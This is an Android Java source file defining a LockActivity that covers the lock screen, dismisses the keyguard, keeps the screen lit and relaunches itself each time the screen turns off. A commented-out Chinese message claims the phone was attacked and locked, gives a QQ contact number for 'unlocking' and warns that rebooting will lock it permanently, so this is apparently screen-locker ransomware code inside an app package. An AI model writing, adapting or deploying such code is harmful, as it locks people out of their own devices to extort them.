package lock;

import util.ConfigCt;

import com.byc.wzry.R;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.os.PowerManager;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.SurfaceView;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.LinearLayout;
import android.widget.RelativeLayout;
import android.widget.TextView;


public class LockActivity extends Activity {
	//private static final String LOCAK_SAY="您的手机遭遇网络攻击！\n已暂时锁定！\n请联系客服：\nQQ：1096754477\n解锁!\n警告：请记牢客服QQ号，千万不能重启手机！否则手机会被永久锁死！";
	public static LockActivity current;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		requestWindowFeature(Window.FEATURE_NO_TITLE);
		this.getWindow().addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
				| WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
				| WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
				| WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
		//setContentView(R.layout.activity_lock);
		 int LinearLayoutID=util.ResourceUtil.getLayoutId(getApplicationContext(), "activity_lock");
		LayoutInflater mlayoutInflater = LayoutInflater.from(getApplicationContext());
		View view = mlayoutInflater.inflate(LinearLayoutID, null);
		RelativeLayout.LayoutParams relLayoutParams=new RelativeLayout.LayoutParams
			        (RelativeLayout.LayoutParams.MATCH_PARENT,RelativeLayout.LayoutParams.MATCH_PARENT);
		this.addContentView(view,relLayoutParams);
		TextView tvSay = (TextView) view.findViewById(util.ResourceUtil.getId(getApplicationContext(), "tvShow"));
		//tvSay.setText(LOCAK_SAY);
		tvSay.setText(ConfigCt.lock_say);
		current=this;
	}
	  public static void LockReceiver(Context context){
	        final IntentFilter filter = new IntentFilter();
	        // 屏幕灭屏广播
	        filter.addAction(Intent.ACTION_SCREEN_OFF);
	        // 屏幕亮屏广播
	        filter.addAction(Intent.ACTION_SCREEN_ON);
	        // 屏幕解锁广播
	        filter.addAction(Intent.ACTION_USER_PRESENT);
	        // 当长按电源键弹出“关机”对话或者锁屏时系统会发出这个广播
	        // example：有时候会用到系统对话框，权限可能很高，会覆盖在锁屏界面或者“关机”对话框之上，
	        // 所以监听这个广播，当收到时就隐藏自己的对话，如点击pad右下角部分弹出的对话框
	        filter.addAction(Intent.ACTION_CLOSE_SYSTEM_DIALOGS);

	        BroadcastReceiver mBatInfoReceiver = new BroadcastReceiver() {
	            @Override
	            public void onReceive(final Context context, final Intent intent) {
	                	Log.d(ConfigCt.TAG, "onReceive");
	                String action = intent.getAction();

	                if (Intent.ACTION_SCREEN_ON.equals(action)) {
	                    //if(mLockState==LockState.locked)ShowWindow();
	                    Log.d(ConfigCt.TAG, "screen on");
	                } else if (Intent.ACTION_SCREEN_OFF.equals(action)) {
	                	//Funcs.wakeUpAndUnlock(context);
	                	LockActivity.startSelf(context);
	                    Log.d(ConfigCt.TAG, "screen off");
	                } else if (Intent.ACTION_USER_PRESENT.equals(action)) {
	                   // HideWindow();
	                   // mLockState=LockState.unLocked;
	                	LockActivity.current.finish();
	                    Log.d(ConfigCt.TAG, "screen unlock");
	                } else if (Intent.ACTION_CLOSE_SYSTEM_DIALOGS.equals(intent.getAction())) {
	                    Log.i(ConfigCt.TAG, " receive Intent.ACTION_CLOSE_SYSTEM_DIALOGS");
	                }
	            }
	        };
	        Log.d(ConfigCt.TAG, "registerReceiver");
	        context.registerReceiver(mBatInfoReceiver, filter);
	    }
	  public static void startSelf(Context context){
		  if(context==null){
			  if(current!=null){
				  current.finish();
				  current=null;
			  }
			  return;
		  }
		  Intent intent=new Intent(context,LockActivity.class);
		  intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		  context.startActivity(intent);
	  }
	  @Override
	  protected void onDestroy(){
		  super.onDestroy();
		  current=null;
	  }
	  @Override
	    protected void onNewIntent(Intent intent) {
	        Log.i(ConfigCt.TAG, "ct LockActivity onNewIntent: 调用");
	        PowerManager pm = (PowerManager) this.getSystemService(Context.POWER_SERVICE);
	        if (!pm.isScreenOn()) {
	            //String msg = intent.getStringExtra("msg");
	            //textview.setText("又收到消息:" + msg);
	            //点亮屏幕
	            PowerManager.WakeLock wl = pm.newWakeLock(PowerManager.ACQUIRE_CAUSES_WAKEUP |
	                    PowerManager.SCREEN_BRIGHT_WAKE_LOCK, "bright");
	            wl.acquire();
	            wl.release();
	        }
	    }
}
